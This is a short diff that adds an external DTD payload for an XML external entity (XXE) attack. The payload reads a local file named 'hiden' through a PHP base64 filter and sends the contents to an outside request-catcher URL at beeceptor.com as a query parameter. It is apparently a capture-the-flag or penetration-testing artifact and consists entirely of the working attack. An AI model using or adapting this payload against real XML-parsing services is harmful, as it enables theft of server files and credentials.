@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=./hiden">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://popopop.free.beeceptor.com/?x=%file;'>">
+%eval;
+%exfiltrate;
